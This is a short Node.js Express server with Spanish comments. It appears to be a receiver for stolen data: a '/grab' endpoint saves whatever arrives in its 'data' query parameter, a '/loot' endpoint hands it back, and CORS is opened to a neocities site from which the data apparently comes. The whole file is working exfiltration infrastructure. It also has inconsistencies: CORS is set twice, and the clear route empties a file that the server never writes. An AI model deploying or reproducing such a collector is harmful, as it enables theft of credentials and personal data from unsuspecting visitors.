const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();
const port = 3000;
let texto = "";

app.use(cors());

app.use(cors({
    origin: 'https://ultraeffective.neocities.org',
    optionsSuccessStatus: 200
}));

app.use(express.urlencoded({ extended: true }));

app.use(express.static('public'));

app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
});

// Ruta para manejar la solicitud a /grab
app.get('/grab', (req, res) => {
    const data = req.query.data;
    if(data){
        texto = data;
        res.send('Datos guardados correctamente.');
    } else {
        res.status(400).send('No se proporcionó ningún dato.');
    }
});

app.get('/loot', (req, res) => {
    res.send(texto);
});

app.get('/clear', (req, res) => {
    fs.writeFile('output.txt', '', (err) => {
        if (err) {
            console.error('Error al limpiar el archivo:', err);
            return res.status(500).send('Error al limpiar el archivo.');
        }
        res.send('Archivo limpiado correctamente.');
    });
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
